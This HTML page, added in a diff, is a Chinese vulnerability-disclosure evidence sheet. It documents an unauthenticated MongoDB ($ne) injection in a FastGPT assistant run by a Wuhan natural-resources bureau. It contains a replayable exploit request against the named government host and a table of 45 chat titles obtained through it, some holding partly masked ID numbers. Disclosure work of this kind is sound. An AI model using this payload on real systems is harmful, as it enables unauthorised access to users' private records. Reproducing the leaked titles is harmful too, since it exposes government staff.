@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<title>CNVD 补充证据 — 武汉市自然资源和规划局 AI 助手未授权数据访问</title>
+<style>
+body { font-family: "Microsoft YaHei", "Segoe UI", sans-serif; margin: 0; background: #eef1f5; color: #1a1a2e; }
+.wrap { max-width: 1080px; margin: 0 auto; padding: 32px; }
+.card { background: #fff; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,.08); padding: 28px 32px; margin-bottom: 24px; }
+h1 { font-size: 22px; margin: 0 0 6px; }
+h2 { font-size: 17px; border-left: 4px solid #c0392b; padding-left: 10px; margin: 22px 0 12px; }
+.sub { color: #666; font-size: 13px; }
+.kv { display: grid; grid-template-columns: 160px 1fr; row-gap: 8px; font-size: 14px; }
+.kv b { color: #555; }
+code, pre { background: #f6f8fa; border: 1px solid #e1e4e8; border-radius: 6px; font-family: Consolas, monospace; }
+pre { padding: 14px; font-size: 13px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+table { width: 100%; border-collapse: collapse; font-size: 13px; }
+th { background: #2d3a4a; color: #fff; padding: 9px 10px; text-align: left; }
+td { border-bottom: 1px solid #e5e8ec; padding: 8px 10px; vertical-align: top; }
+tr:nth-child(even) td { background: #fafbfc; }
+.tt { font-weight: 600; }
+.tm { color: #777; font-family: Consolas, monospace; font-size: 12px; }
+.badge { display: inline-block; background: #fdecea; color: #c0392b; border-radius: 4px; padding: 1px 7px; font-size: 11px; margin-left: 6px; }
+.badge.g { background: #e8f4fd; color: #1a6fa8; }
+.harm li { margin: 7px 0; font-size: 14px; }
+.foot { text-align: center; color: #999; font-size: 12px; padding: 18px; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<div class="card">
+  <h1>漏洞危害补充证明 — 未授权访问政务 AI 平台全部用户聊天记录</h1>
+  <div class="sub">报送单位对应目标：武汉市自然资源和城乡建设局（ai.zrzyhcxjs.wuhan.gov.cn）· FastGPT NoSQL 注入（CVE-2026-79483 同类） · 取证时间 2026-10-08 19:59</div>
+</div>
+
+<div class="card">
+  <h2>一、漏洞与目标基本信息</h2>
+  <div class="kv">
+    <b>受影响单位</b><span>武汉市自然资源和城乡建设局（武汉市政府域名 wuhan.gov.cn）</span>
+    <b>漏洞系统</b><span>FastGPT 智能问答助手（部署于该局政务网，对外提供自然资源业务问答）</span>
+    <b>漏洞类型</b><span>NoSQL 注入（MongoDB 查询注入）→ 未授权访问其他用户聊天记录（CWE-943 / CWE-862）</span>
+    <b>漏洞接口</b><span><code>POST /api/core/chat/getHistories</code></span>
+    <b>触发条件</b><span>无需登录、无需任何凭证，公网直接可发（匿名未授权）</span>
+  </div>
+</div>
+
+<div class="card">
+  <h2>二、验证请求（可 1:1 复现）</h2>
+  <pre>POST http://ai.zrzyhcxjs.wuhan.gov.cn:9001/api/core/chat/getHistories HTTP/1.1
+Host: ai.zrzyhcxjs.wuhan.gov.cn:9001
+Content-Type: application/json
+
+{"shareId": {"$ne": ""}, "outLinkUid": {"$ne": ""}, "offset": 0, "pageSize": 50}</pre>
+  <div class="sub">响应：HTTP 200，服务端返回 <b>total = 45</b> 条聊天记录，本页实际取回 45 条（匿名用户本无权访问其中任何一条）。</div>
+</div>
+
+<div class="card">
+  <h2>三、未授权获取的全部 45 条用户聊天记录</h2>
+  <div class="sub" style="margin-bottom:10px">以下为匿名请求直接返回的他单位工作人员真实对话标题。内容涉及土地利用现状、基本农田图层、违法图斑认定等<b>自然资源执法核心业务数据</b>；含长编号的信息已做脱敏处理。</div>
+  <table>
+    <tr><th style="width:44px">#</th><th>聊天记录标题（用户真实提问内容）</th><th style="width:170px">最后活动时间(UTC)</th><th style="width:190px">会话ID</th></tr>
+    <tr><td>1</td><td class="tt">土地管理法第三十六条的内容是什么？</td><td class="tm">2026-09-29T04:16:41</td><td class="tm">chat-20260929121636</td></tr>
+<tr><td>2</td><td class="tt">420112**********2604 <span class="badge">含长数字编号(已脱敏)</span></td><td class="tm">2026-09-29T04:16:28</td><td class="tm">chat-1790655388609</td></tr>
+<tr><td>3</td><td class="tt">只显示土地利用现状2024中的水浇地 <span class="badge g">政务业务内容</span></td><td class="tm">2026-09-29T02:31:43</td><td class="tm">chat-1790649104623</td></tr>
+<tr><td>4</td><td class="tt">加载基本农田图层 <span class="badge g">政务业务内容</span></td><td class="tm">2026-09-29T00:34:05</td><td class="tm">chat-1790642046724</td></tr>
+<tr><td>5</td><td class="tt">武汉市2026年疑似违法图斑中，最终认定 <span class="badge g">政务业务内容</span></td><td class="tm">2026-09-29T00:33:36</td><td class="tm">chat-1790642015984</td></tr>
+<tr><td>6</td><td class="tt">420112**********2604 <span class="badge">含长数字编号(已脱敏)</span></td><td class="tm">2026-09-29T00:32:00</td><td class="tm">chat-1790641912335</td></tr>
+<tr><td>7</td><td class="tt">加载管理区图层</td><td class="tm">2026-09-12T01:13:14</td><td class="tm">chat-1789175575143</td></tr>
+<tr><td>8</td><td class="tt">定位到经纬度114.3，30.6</td><td class="tm">2026-09-11T08:43:28</td><td class="tm">chat-1789116239277</td></tr>
+<tr><td>9</td><td class="tt">定位到经纬度114.3，30.6</td><td class="tm">2026-09-11T08:42:11</td><td class="tm">chat-1789116165689</td></tr>
+<tr><td>10</td><td class="tt">加载土地利用现状2024图层
+
+ <span class="badge g">政务业务内容</span></td><td class="tm">2026-09-11T08:37:58</td><td class="tm">chat-1789115907253</td></tr>
+<tr><td>11</td><td class="tt">加载土地利用现状2024图层 <span class="badge g">政务业务内容</span></td><td class="tm">2026-09-11T08:34:58</td><td class="tm">chat-1789115734620</td></tr>
+<tr><td>12</td><td class="tt">加载土地利用现状2024图层
+
+ <span class="badge g">政务业务内容</span></td><td class="tm">2026-09-11T08:28:47</td><td class="tm">chat-1789115362427</td></tr>
+<tr><td>13</td><td class="tt">加载土地利用现状2024图层 <span class="badge g">政务业务内容</span></td><td class="tm">2026-09-11T08:24:17</td><td class="tm">chat-1789115093434</td></tr>
+<tr><td>14</td><td class="tt">加载基本农田图层 <span class="badge g">政务业务内容</span></td><td class="tm">2026-09-11T08:12:22</td><td class="tm">chat-1789114377799</td></tr>
+<tr><td>15</td><td class="tt">加载土地利用现状2024图层 <span class="badge g">政务业务内容</span></td><td class="tm">2026-09-11T08:11:29</td><td class="tm">chat-1789114324216</td></tr>
+<tr><td>16</td><td class="tt">加载土地利用现状2024图层 <span class="badge g">政务业务内容</span></td><td class="tm">2026-09-11T07:17:32</td><td class="tm">chat-1789111088212</td></tr>
+<tr><td>17</td><td class="tt">将 url ：http://datase</td><td class="tm">2026-09-11T07:17:16</td><td class="tm">chat-1789111072165</td></tr>
+<tr><td>18</td><td class="tt">将 url ：http://datase</td><td class="tm">2026-09-11T07:12:07</td><td class="tm">chat-1789110762738</td></tr>
+<tr><td>19</td><td class="tt">加载管理区图层</td><td class="tm">2026-09-11T07:11:46</td><td class="tm">chat-1789110742042</td></tr>
+<tr><td>20</td><td class="tt">加载管理区图层</td><td class="tm">2026-09-11T07:07:52</td><td class="tm">chat-1789110508986</td></tr>
+<tr><td>21</td><td class="tt">切换底图为卫星影像</td><td class="tm">2026-09-11T07:07:44</td><td class="tm">chat-1789110501286</td></tr>
+<tr><td>22</td><td class="tt">地图定位到李集街</td><td class="tm">2026-09-11T07:07:36</td><td class="tm">chat-1789110492583</td></tr>
+<tr><td>23</td><td class="tt">定位到坐标789310，387691</td><td class="tm">2026-09-11T07:07:28</td><td class="tm">chat-1789110484860</td></tr>
+<tr><td>24</td><td class="tt">定位到经纬度114.3，30.6</td><td class="tm">2026-09-11T07:07:16</td><td class="tm">chat-1789110471647</td></tr>
+<tr><td>25</td><td class="tt">定位到经纬度114.3，30.6</td><td class="tm">2026-09-11T06:55:36</td><td class="tm">chat-1789109771929</td></tr>
+<tr><td>26</td><td class="tt">加载土地利用现状2024图层 <span class="badge g">政务业务内容</span></td><td class="tm">2026-09-11T04:41:49</td><td class="tm">chat-1789101744638</td></tr>
+<tr><td>27</td><td class="tt">加载基本农田图层 <span class="badge g">政务业务内容</span></td><td class="tm">2026-09-11T04:41:33</td><td class="tm">chat-1789101729472</td></tr>
+<tr><td>28</td><td class="tt">地图定位到李集街</td><td class="tm">2026-09-11T04:41:10</td><td class="tm">chat-1789101705507</td></tr>
+<tr><td>29</td><td class="tt">地图定位到李集街</td><td class="tm">2026-09-11T04:36:03</td><td class="tm">chat-1789101396310</td></tr>
+<tr><td>30</td><td class="tt">定位到经纬度114.3，30.6</td><td class="tm">2026-09-11T04:28:36</td><td class="tm">chat-1789100953505</td></tr>
+<tr><td>31</td><td class="tt">武汉市2026年疑似违法图斑中，最终认定 <span class="badge g">政务业务内容</span></td><td class="tm">2026-09-11T04:28:22</td><td class="tm">chat-1789100937993</td></tr>
+<tr><td>32</td><td class="tt">加载基本农田图层 <span class="badge g">政务业务内容</span></td><td class="tm">2026-09-11T04:27:25</td><td class="tm">chat-1789100881316</td></tr>
+<tr><td>33</td><td class="tt">将 url ：http://datase</td><td class="tm">2026-09-11T04:13:39</td><td class="tm">chat-1789100054494</td></tr>
+<tr><td>34</td><td class="tt">加载基本农田图层 <span class="badge g">政务业务内容</span></td><td class="tm">2026-09-11T04:13:14</td><td class="tm">chat-1789100028524</td></tr>
+<tr><td>35</td><td class="tt">加载基本农田图层 <span class="badge g">政务业务内容</span></td><td class="tm">2026-09-11T04:11:48</td><td class="tm">chat-1789099944540</td></tr>
+<tr><td>36</td><td class="tt">加载基本农田图层 <span class="badge g">政务业务内容</span></td><td class="tm">2026-09-11T04:09:34</td><td class="tm">chat-1789099809916</td></tr>
+<tr><td>37</td><td class="tt">新洲区2010到2024年土地卫片执法发</td><td class="tm">2026-09-11T04:09:16</td><td class="tm">chat-1789099791703</td></tr>
+<tr><td>38</td><td class="tt">在什么情况下，可以将农用地转为建设用地？</td><td class="tm">2026-09-11T04:08:38</td><td class="tm">chat-20260911120902</td></tr>
+<tr><td>39</td><td class="tt">地图定位到李集街</td><td class="tm">2026-09-11T04:07:38</td><td class="tm">chat-1789099693686</td></tr>
+<tr><td>40</td><td class="tt">地图定位到李集街</td><td class="tm">2026-09-11T04:02:30</td><td class="tm">chat-1789099386268</td></tr>
+<tr><td>41</td><td class="tt">地图定位到李集街</td><td class="tm">2026-09-11T03:51:27</td><td class="tm">chat-1789098722867</td></tr>
+<tr><td>42</td><td class="tt">加载管理区图层</td><td class="tm">2026-09-11T03:51:00</td><td class="tm">chat-1789098696282</td></tr>
+<tr><td>43</td><td class="tt">切换底图为卫星影像</td><td class="tm">2026-09-11T03:49:48</td><td class="tm">chat-1789098624557</td></tr>
+<tr><td>44</td><td class="tt">地图定位到李集街</td><td class="tm">2026-09-11T03:48:40</td><td class="tm">chat-1789098555808</td></tr>
+<tr><td>45</td><td class="tt">地图定位到李集街</td><td class="tm">2026-09-11T01:40:36</td><td class="tm">chat-1789090832455</td></tr>
+  </table>
+</div>
+
+<div class="card">
+  <h2>四、危害说明</h2>
+  <ul class="harm">
+    <li><b>未授权数据泄露：</b>接口无任何鉴权，攻击者可遍历全部 45 条政务工作人员的 AI 对话记录，其中包含执法图斑认定、基本农田、土地利用现状等敏感业务内容。</li>
+    <li><b>会话接管：</b>每条记录返回 chatId，结合 FastGPT 同版本其他未授权接口可进一步读取对话全文（含上传的文件名与内容），并可向模型上下文投毒。</li>
+    <li><b>数据链风险：</b>对话标题中出现的个人/业务长编号（已脱敏）可被用于撞库或社工，政务人员身份与业务行为被暴露。</li>
+    <li><b>影响范围：</b>该局 AI 助手面向全局工作人员，泄露面覆盖所有使用人员；同版本 FastGPT 全国部署量巨大，属通用型漏洞。</li>
+  </ul>
+</div>
+
+<div class="foot">取证脚本：Python requests 直接发包复现 · 发现/验证：indifference · 2026-10-08 19:59</div>
+</div>
+</body>
+</html>
